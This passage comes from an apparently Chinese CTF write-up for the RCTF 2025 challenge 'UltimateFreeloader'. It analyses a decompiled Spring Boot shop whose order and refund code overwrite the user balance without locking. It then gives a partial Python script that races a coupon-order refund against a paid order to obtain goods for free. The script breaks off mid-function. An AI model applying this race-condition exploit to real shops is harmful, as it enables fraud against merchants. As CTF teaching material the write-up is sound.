</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>sys</span><span class=o>.</span><span class=n>exit</span><span class=p>(</span><span class=n>main</span><span class=p>())</span>
</span></span></code></pre></td></tr></table></div></div><p><img src=/img/2025-RCTF/19.png alt=img></p><h2 id=ultimatefreeloader>UltimateFreeloader</h2><p>把附件给的 jar 包反编译一下，分析一下源码可以看到这是一个基于 Spring Boot 的电商购物系统后端应用，然后有很多的功能模块，/api/flag/get 接口用于返回flag，但是有很多限制：</p><ul><li>用户已认证（有效的JWT token）</li><li>购买并完成（状态为 COMPLETED）以下4个商品：<ul><li>Little Potato（小土豆）- 5.50</li><li>Sweet Potato（地瓜）- 8.80</li><li>Fish Fish（鱼）- 4.20</li><li>Large Potato（大土豆）- 10.00</li></ul></li><li>用户余额必须等于 10.00（不能低于10）</li><li>用户必须有一个未使用的优惠券</li></ul><p>如果我们注册一个用户，我们的初始余额是10元，然后默认有一个 10.00 的优惠券，分析整个题目，从揣摩出题人的角度可以看出来，这个题的目标应该是想让我们零元购商品，毕竟最后的要求是我们的余额还是10，所以肯定不是想找个什么办法刷钱啥的，而是要求我们在保留优惠券的情况下零元购所有商品</p><p>再看代码可以发现项目里有一个redis锁，创建订单的时候有一个锁防止我们同时创建多个订单，退款的时候有一个锁防止我们重复退款。用户其实一共就只能进行两个操作，一个是创建订单(可以选择使用优惠券)，另一个是退款，既然没法在创建订单时并发做竞争，也没法在退款时并发做竞争，唯一可行的方法就是在创建订单和退款之间并发做竞争了。</p><p>想要在退款和创建订单之间做竞争，前提肯定是现在我们有一个购买成功的订单，有了这个订单之后我们才能退款，然后再想办法再创建订单，因为用户的钱是有限的，只有10元，要是不使用优惠券比如买了 Large Potato 之后就没钱买其他东西了，所以退款订单和创建订单二者之间必然有一个订单是通过优惠券创建的。</p><p>这里再思考这两个订单是哪个订单是用优惠券创建的，假设创建订单用优惠券创建，退款订单是直接花钱买的，即使我们竞争成功实现零元购也没意义，用优惠券创建订单本来就不用花钱，而且优惠券也没了，所以唯一的可能就是退款订单是用优惠券创建的，创建订单是直接花钱买的，说不定还有奇迹发生，能通过某种神奇的方式利用竞争免费创建订单。</p><p>先头脑风暴一下大概的思路，然后仔细分析一下这一块的代码，先看到创建订单这里，过程大概就是先对购买操作上锁，然后校验用户和商品，接着计算价格，如果优惠券金额大于商品价格，最终价格会被置为 0，最后检查余额是否能支付这个最终价格。</p><p><img src=/img/2025-RCTF/20.png alt=img></p><p>代码这里看起来没什么问题，后面就是数据库这边的操作了，会先用<code>this.orderMapper.insert(order):</code> 在订单表 orders 中插入一条新的订单记录，接着用 <code>BigDecimal newBalance = user.getBalance().subtract(finalPrice);</code>计算一个新余额，最后用<code>this.userService.updateBalance(userId, newBalance)</code>把新余额写入用户的账户，这里的逻辑其实就非常的奇怪了，正常的代码逻辑应该是对数据库里的余额做加减，这里却是算出一个新余额后替换数据库里的余额，并且还没上锁，一看就很可疑的样子。</p><p><img src=/img/2025-RCTF/21.png alt=img></p><p>然后再看到退款这边的逻辑，可以看到差不多，先用加法算一下当前的余额加上退款后的值得到一个新余额，然后用<code>this.userService.updateBalance</code>把用户的余额替换成新余额的值。</p><p><img src=/img/2025-RCTF/22.png alt=img></p><p>所以之前的思路确实是没问题的，就是要在退款订单和创建订单之间并发做竞争，假设退款订单的顺序是1.检查订单是否合法2.将余额替换成10(假设退款后的余额应该是10)，创建订单的顺序是3.检查订单是否合法4.将余额替换成0(假设购买后的余额应该是0)，只要竞争到一个1342的顺序，就能在完成创建订单的所有操作后反而执行到退款订单的操作2，将余额替换成10，这样就成功实现零元购了。</p><p>因此思路就是在退款订单(用券)和创建订单(不用券)之间一直并发做条件竞争，直到竞争到某个创建订单是零元购才停，否则一直竞争，最后把四个商品全部零元购，这样就能在不花钱或者优惠券的情况下完成所有订单的购买</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span><span class=lnt>136
</span><span class=lnt>137
</span><span class=lnt>138
</span><span class=lnt>139
</span><span class=lnt>140
</span><span class=lnt>141
</span><span class=lnt>142
</span><span class=lnt>143
</span><span class=lnt>144
</span><span class=lnt>145
</span><span class=lnt>146
</span><span class=lnt>147
</span><span class=lnt>148
</span><span class=lnt>149
</span><span class=lnt>150
</span><span class=lnt>151
</span><span class=lnt>152
</span><span class=lnt>153
</span><span class=lnt>154
</span><span class=lnt>155
</span><span class=lnt>156
</span><span class=lnt>157
</span><span class=lnt>158
</span><span class=lnt>159
</span><span class=lnt>160
</span><span class=lnt>161
</span><span class=lnt>162
</span><span class=lnt>163
</span><span class=lnt>164
</span><span class=lnt>165
</span><span class=lnt>166
</span><span class=lnt>167
</span><span class=lnt>168
</span><span class=lnt>169
</span><span class=lnt>170
</span><span class=lnt>171
</span><span class=lnt>172
</span><span class=lnt>173
</span><span class=lnt>174
</span><span class=lnt>175
</span><span class=lnt>176
</span><span class=lnt>177
</span><span class=lnt>178
</span><span class=lnt>179
</span><span class=lnt>180
</span><span class=lnt>181
</span><span class=lnt>182
</span><span class=lnt>183
</span><span class=lnt>184
</span><span class=lnt>185
</span><span class=lnt>186
</span><span class=lnt>187
</span><span class=lnt>188
</span><span class=lnt>189
</span><span class=lnt>190
</span><span class=lnt>191
</span><span class=lnt>192
</span><span class=lnt>193
</span><span class=lnt>194
</span><span class=lnt>195
</span><span class=lnt>196
</span><span class=lnt>197
</span><span class=lnt>198
</span><span class=lnt>199
</span><span class=lnt>200
</span><span class=lnt>201
</span><span class=lnt>202
</span><span class=lnt>203
</span><span class=lnt>204
</span><span class=lnt>205
</span><span class=lnt>206
</span><span class=lnt>207
</span><span class=lnt>208
</span><span class=lnt>209
</span><span class=lnt>210
</span><span class=lnt>211
</span><span class=lnt>212
</span><span class=lnt>213
</span><span class=lnt>214
</span><span class=lnt>215
</span><span class=lnt>216
</span><span class=lnt>217
</span><span class=lnt>218
</span><span class=lnt>219
</span><span class=lnt>220
</span><span class=lnt>221
</span><span class=lnt>222
</span><span class=lnt>223
</span><span class=lnt>224
</span><span class=lnt>225
</span><span class=lnt>226
</span><span class=lnt>227
</span><span class=lnt>228
</span><span class=lnt>229
</span><span class=lnt>230
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>random</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>string</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>threading</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>time</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>decimal</span> <span class=kn>import</span> <span class=n>Decimal</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>BASE_URL</span> <span class=o>=</span> <span class=s2>&#34;http://127.0.0.1:8086&#34;</span>
</span></span><span class=line><span class=cl><span class=c1># BASE_URL = &#34;http://61.147.171.35:51469&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>TARGET_PRODUCTS</span> <span class=o>=</span> <span class=p>[</span><span class=s2>&#34;Little Potato&#34;</span><span class=p>,</span> <span class=s2>&#34;Sweet Potato&#34;</span><span class=p>,</span> <span class=s2>&#34;Fish Fish&#34;</span><span class=p>,</span> <span class=s2>&#34;Large Potato&#34;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>BASE_PRODUCT_NAME</span> <span class=o>=</span> <span class=s2>&#34;Little Potato&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>SESSION</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>Session</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>api_request</span><span class=p>(</span><span class=n>method</span><span class=p>,</span> <span class=n>path</span><span class=p>,</span> <span class=n>token</span><span class=o>=</span><span class=kc>None</span><span class=p>,</span> <span class=o>**</span><span class=n>kwargs</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>url</span> <span class=o>=</span> <span class=n>BASE_URL</span> <span class=o>+</span> <span class=n>path</span>
</span></span><span class=line><span class=cl>    <span class=n>headers</span> <span class=o>=</span> <span class=n>kwargs</span><span class=o>.</span><span class=n>pop</span><span class=p>(</span><span class=s2>&#34;headers&#34;</span><span class=p>,</span> <span class=p>{})</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>token</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>headers</span><span class=p>[</span><span class=s2>&#34;Authorization&#34;</span><span class=p>]</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;Bearer </span><span class=si>{</span><span class=n>token</span><span class=si>}</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=s2>&#34;json&#34;</span> <span class=ow>in</span> <span class=n>kwargs</span> <span class=ow>and</span> <span class=s2>&#34;Content-Type&#34;</span> <span class=ow>not</span> <span class=ow>in</span> <span class=n>headers</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>headers</span><span class=p>[</span><span class=s2>&#34;Content-Type&#34;</span><span class=p>]</span> <span class=o>=</span> <span class=s2>&#34;application/json&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>3</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>resp</span> <span class=o>=</span> <span class=n>SESSION</span><span class=o>.</span><span class=n>request</span><span class=p>(</span><span class=n>method</span><span class=p>,</span> <span class=n>url</span><span class=p>,</span> <span class=n>headers</span><span class=o>=</span><span class=n>headers</span><span class=p>,</span> <span class=n>timeout</span><span class=o>=</span><span class=mi>5</span><span class=p>,</span> <span class=o>**</span><span class=n>kwargs</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=n>resp</span><span class=o>.</span><span class=n>json</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=k>except</span> <span class=ne>Exception</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=p>{</span><span class=s2>&#34;code&#34;</span><span class=p>:</span> <span class=n>resp</span><span class=o>.</span><span class=n>status_code</span><span class=p>,</span> <span class=s2>&#34;raw&#34;</span><span class=p>:</span> <span class=n>resp</span><span class=o>.</span><span class=n>text</span><span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>except</span> <span class=ne>Exception</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=mf>0.2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=p>{</span><span class=s2>&#34;code&#34;</span><span class=p>:</span> <span class=o>-</span><span class=mi>1</span><span class=p>,</span> <span class=s2>&#34;error&#34;</span><span class=p>:</span> <span class=s2>&#34;request failed&#34;</span><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>random_username</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=s2>&#34;ctf&#34;</span> <span class=o>+</span> <span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>random</span><span class=o>.</span><span class=n>choices</span><span class=p>(</span><span class=n>string</span><span class=o>.</span><span class=n>ascii_lowercase</span> <span class=o>+</span> <span class=n>string</span><span class=o>.</span><span class=n>digits</span><span class=p>,</span> <span class=n>k</span><span class=o>=</span><span class=mi>8</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>register_user</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>username</span> <span class=o>=</span> <span class=n>random_username</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>email</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>username</span><span class=si>}</span><span class=s2>@example.com&#34;</span>
</span></span><span class=line><span class=cl>        <span class=n>body</span> <span class=o>=</span> <span class=p>{</span><span class=s2>&#34;username&#34;</span><span class=p>:</span> <span class=n>username</span><span class=p>,</span> <span class=s2>&#34;password&#34;</span><span class=p>:</span> <span class=s2>&#34;Pass1234&#34;</span><span class=p>,</span> <span class=s2>&#34;email&#34;</span><span class=p>:</span> <span class=n>email</span><span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=n>data</span> <span class=o>=</span> <span class=n>api_request</span><span class=p>(</span><span class=s2>&#34;POST&#34;</span><span class=p>,</span> <span class=s2>&#34;/api/user/register&#34;</span><span class=p>,</span> <span class=n>json</span><span class=o>=</span><span class=n>body</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>data</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s2>&#34;code&#34;</span><span class=p>)</span> <span class=o>==</span> <span class=mi>200</span> <span class=ow>and</span> <span class=n>data</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s2>&#34;data&#34;</span><span class=p>,</span> <span class=p>{})</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s2>&#34;success&#34;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>d</span> <span class=o>=</span> <span class=n>data</span><span class=p>[</span><span class=s2>&#34;data&#34;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>            <span class=n>user</span> <span class=o>=</span> <span class=n>d</span><span class=p>[</span><span class=s2>&#34;user&#34;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[+] Registered user </span><span class=si>{</span><span class=n>username</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>user</span><span class=p>[</span><span class=s2>&#34;id&#34;</span><span class=p>],</span> <span class=n>d</span><span class=p>[</span><span class=s2>&#34;token&#34;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[-] register failed:&#34;</span><span class=p>,</span> <span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=mf>0.5</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>get_products</span><span class=p>(</span><span class=n>token</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=n>api_request</span><span class=p>(</span><span class=s2>&#34;GET&#34;</span><span class=p>,</span> <span class=s2>&#34;/api/product/list&#34;</span><span class=p>,</span> <span class=n>token</span><span class=o>=</span><span class=n>token</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>assert</span> <span class=n>data</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s2>&#34;code&#34;</span><span class=p>)</span> <span class=o>==</span> <span class=mi>200</span><span class=p>,</span> <span class=n>data</span>
</span></span><span class=line><span class=cl>    <span class=n>products</span> <span class=o>=</span> <span class=n>data</span><span class=p>[</span><span class=s2>&#34;data&#34;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=p>{</span><span class=n>p</span><span class=p>[</span><span class=s2>&#34;name&#34;</span><span class=p>]:</span> <span class=n>p</span><span class=p>[</span><span class=s2>&#34;id&#34;</span><span class=p>]</span> <span class=k>for</span> <span class=n>p</span> <span class=ow>in</span> <span class=n>products</span><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>get_coupon_info</span><span class=p>(</span><span class=n>token</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=n>api_request</span><span class=p>(</span><span class=s2>&#34;GET&#34;</span><span class=p>,</span> <span class=s2>&#34;/api/coupon/my&#34;</span><span class=p>,</span> <span class=n>token</span><span class=o>=</span><span class=n>token</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>assert</span> <span class=n>data</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s2>&#34;code&#34;</span><span class=p>)</span> <span class=o>==</span> <span class=mi>200</span><span class=p>,</span> <span class=n>data</span>
</span></span><span class=line><span class=cl>    <span class=n>coupons</span> <span class=o>=</span> <span class=n>data</span><span class=p>[</span><span class=s2>&#34;data&#34;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=k>assert</span> <span class=n>coupons</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>coupons</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>get_user_balance</span><span class=p>(</span><span class=n>token</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=n>api_request</span><span class=p>(</span><span class=s2>&#34;GET&#34;</span><span class=p>,</span> <span class=s2>&#34;/api/user/info&#34;</span><span class=p>,</span> <span class=n>token</span><span class=o>=</span><span class=n>token</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>assert</span> <span class=n>data</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s2>&#34;code&#34;</span><span class=p>)</span> <span class=o>==</span> <span class=mi>200</span><span class=p>,</span> <span class=n>data</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>Decimal</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>data</span><span class=p>[</span><span class=s2>&#34;data&#34;</span><span class=p>][</span><span class=s2>&#34;balance&#34;</span><span class=p>]))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>get_orders</span><span class=p>(</span><span class=n>token</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=n>api_request</span><span class=p>(</span><span class=s2>&#34;GET&#34;</span><span class=p>,</span> <span class=s2>&#34;/api/order/my&#34;</span><span class=p>,</span> <span class=n>token</span><span class=o>=</span><span class=n>token</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>assert</span> <span class=n>data</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s2>&#34;code&#34;</span><span class=p>)</span> <span class=o>==</span> <span class=mi>200</span><span class=p>,</span> <span class=n>data</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>data</span><span class=p>[</span><span class=s2>&#34;data&#34;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>create_order</span><span class=p>(</span><span class=n>token</span><span class=p>,</span> <span class=n>product_id</span><span class=p>,</span> <span class=n>quantity</span><span class=o>=</span><span class=s2>&#34;1&#34;</span><span class=p>,</span> <span class=n>coupon_id</span><span class=o>=</span><span class=kc>None</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>body</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;productId&#34;</span><span class=p>:</span> <span class=n>product_id</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;quantity&#34;</span><span class=p>:</span> <span class=n>quantity</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;couponId&#34;</span><span class=p>:</span> <span class=n>coupon_id</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>api_request</span><span class=p>(</span><span class=s2>&#34;POST&#34;</span><span class=p>,</span> <span class=s2>&#34;/api/order/create&#34;</span><span class=p>,</span> <span class=n>token</span><span class=o>=</span><span class=n>token</span><span class=p>,</span> <span class=n>json</span><span class=o>=</span><span class=n>body</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>refund_order</span><span class=p>(</span><span class=n>token</span><span class=p>,</span> <span class=n>order_id</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>api_request</span><span class=p>(</span><span class=s2>&#34;POST&#34;</span><span class=p>,</span> <span class=sa>f</span><span class=s2>&#34;/api/order/refund/</span><span class=si>{</span><span class=n>order_id</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>,</span> <span class=n>token</span><span class=o>=</span><span class=n>token</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>ensure_coupon_unused</span><span class=p>(</span><span class=n>token</span><span class=p>,</span> <span class=n>coupon_id</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>coupon</span> <span class=o>=</span> <span class=n>get_coupon_info</span><span class=p>(</span><span class=n>token</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=n>coupon</span><span class=p>[</span><span class=s2>&#34;isUsed&#34;</span><span class=p>]:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>orders</span> <span class=o>=</span> <span class=n>get_orders</span><span class=p>(</span><span class=n>token</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>o</span> <span class=ow>in</span> <span class=n>orders</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>o</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s2>&#34;couponId&#34;</span><span class=p>)</span> <span class=o>==</span> <span class=n>coupon_id</span> <span class=ow>and</span> <span class=n>o</span><span class=p>[</span><span class=s2>&#34;status&#34;</span><span class=p>]</span> <span class=o>==</span> <span class=s2>&#34;COMPLETED&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;  [*] Restoring coupon by refunding order </span><span class=si>{</span><span class=n>o</span><span class=p>[</span><span class=s1>&#39;id&#39;</span><span class=p>]</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>refund_order</span><span class=p>(</span><span class=n>token</span><span class=p>,</span> <span class=n>o</span><span class=p>[</span><span class=s2>&#34;id&#34;</span><span class=p>])</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>coupon</span> <span class=o>=</span> <span class=n>get_coupon_info</span><span class=p>(</span><span class=n>token</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>assert</span> <span class=ow>not</span> <span class=n>coupon</span><span class=p>[</span><span class=s2>&#34;isUsed&#34;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>zero_cost_purchase</span><span class=p>(</span><span class=n>token</span><span class=p>,</span> <span class=n>product_ids</span><span class=p>,</span> <span class=n>coupon_id</span><span class=p>,</span> <span class=n>target_name</span><span class=p>,</span> <span class=n>max_tries</span><span class=o>=</span><span class=mi>30</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>target_pid</span> <span class=o>=</span> <span class=n>product_ids</span><span class=p>[</span><span class=n>target_name</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>base_pid</span> <span class=o>=</span> <span class=n>product_ids</span><span class=p>[</span><span class=n>BASE_PRODUCT_NAME</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>attempt</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=n>max_tries</span> <span class=o>+</span> <span class=mi>1</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;  [*] </span><span class=si>{</span><span class=n>target_name</span><span class=si>}</span><span class=s2> try #</span><span class=si>{</span><span class=n>attempt</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>ensure_coupon_unused</span><span class=p>(</span><span class=n>token</span><span class=p>,</span> <span class=n>coupon_id</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>base_resp</span> <span class=o>=</span> <span class=n>create_order</span><span class=p>(</span><span class=n>token</span><span class=p>,</span> <span class=n>base_pid</span><span class=p>,</span> <span class=n>quantity</span><span class=o>=</span><span class=s2>&#34;1&#34;</span><span class=p>,</span> <span class=n>coupon_id</span><span class=o>=</span><span class=n>coupon_id</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>base_resp</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s2>&#34;code&#34;</span><span class=p>)</span> <span class=o>!=</span> <span class=mi>200</span> <span class=ow>or</span> <span class=ow>not</span> <span class=n>base_resp</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s2>&#34;data&#34;</span><span class=p>,</span> <span class=p>{})</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s2>&#34;success&#34;</span><span class=p>):</span>
